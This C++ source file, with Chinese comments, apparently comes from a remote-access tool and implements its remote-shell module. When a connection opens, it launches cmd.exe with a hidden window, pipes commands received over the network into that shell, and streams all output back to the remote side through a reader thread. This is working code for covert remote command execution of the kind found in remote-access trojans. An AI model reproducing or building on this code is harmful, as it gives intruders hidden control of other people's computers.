#include "Cmd.h"
#include <stdio.h>

CCmd::CCmd(DWORD dwIdentity):
CEventHandler(dwIdentity)
{
	m_hReadPipe = NULL;
	m_hWritePipe = NULL;

	m_hReadThread = NULL;

	memset(&m_pi, 0, sizeof(m_pi));
}


CCmd::~CCmd()
{
}


void ReadThread(CCmd*pCmd)
{
	char buffer[4096];
	DWORD dwRead = 0;
	while (ReadFile(pCmd->m_hReadPipe, buffer, 4095, &dwRead, NULL))
	{
		buffer[dwRead] = 0;
		pCmd->Send(CMD_RESULT, buffer, dwRead + 1);
		dwRead = NULL;
	}
	pCmd->Disconnect();
}

void CCmd::OnClose()
{
	//关掉cmd.;
	if (m_pi.hProcess != NULL)
	{
		TerminateProcess(m_pi.hProcess, 0);
		//
		CloseHandle(m_pi.hProcess);
		CloseHandle(m_pi.hThread);
	}
	//线程ReadFile会结束，等待线程退出。;
	if(WAIT_TIMEOUT == WaitForSingleObject(m_hReadThread, 60000))
	{
		TerminateThread(m_hReadThread,0);
		WaitForSingleObject(m_hReadThread, INFINITE);
	}
	CloseHandle(m_hReadThread);
	//cmd 杀不掉;
	//关闭管道.;
	CloseHandle(m_hReadPipe);
	CloseHandle(m_hWritePipe);
}
void CCmd::OnConnect()
{
	DWORD dwStatu = 0;
	if (-1 == CmdBegin())
	{
		dwStatu = -1;
		Send(CMD_BEGIN, (char*)&dwStatu, sizeof(DWORD));
		Disconnect();
		return;
	}
	//成功.;
	Send(CMD_BEGIN, (char*)&dwStatu, sizeof(DWORD));
}
void CCmd::OnReadPartial(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{

}
void CCmd::OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*Buffer)
{
	switch (Event)
	{
	case CMD_COMMAND:
		OnCommand(Buffer);
		break;
	default:
		break;
	}
}

void CCmd::OnCommand(char*szCmd)
{
	DWORD dwWrite = 0;
	DWORD dwLeft = strlen(szCmd);
	while(dwLeft>0)
	{
		dwWrite = 0;
		if (FALSE == WriteFile(m_hWritePipe, szCmd,dwLeft, &dwWrite, NULL))
		{	
			Disconnect();
			break;
		}
		szCmd+=dwWrite;
		dwLeft -= dwWrite;
	}
}
//cmd退出有两种情况:;
//		1.server 关闭	cmd不会退出,需要自己关闭.;
//		2.输入exit.		Read会失败.;
int CCmd::CmdBegin()
{ 
	HANDLE hCmdReadPipe = NULL, hCmdWritePipe = NULL;
	//
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (FALSE == CreatePipe(&m_hReadPipe, &hCmdWritePipe, &sa, 0))
		return -1;
	if (FALSE == CreatePipe(&hCmdReadPipe,&m_hWritePipe,  &sa, 0))
		return -1;

	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	//si.wShowWindow = SW_SHOW;
	si.hStdError = hCmdWritePipe;
	si.hStdOutput = hCmdWritePipe;
	si.hStdInput = hCmdReadPipe;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	
	//
	WCHAR szCmdPath[1024] = {0};
	GetSystemDirectory(szCmdPath,1024);
	wcscat(szCmdPath,L"\\cmd.exe");
	if (FALSE == CreateProcess(szCmdPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL,NULL ,&si, &m_pi))
	{
		return -1;
	}

	//不需要这两个,直接关掉.;
	CloseHandle(hCmdReadPipe);
	CloseHandle(hCmdWritePipe);

	m_hReadThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadThread, this, NULL, NULL);
	if (m_hReadThread == NULL)
		return -1;
	return 0;
}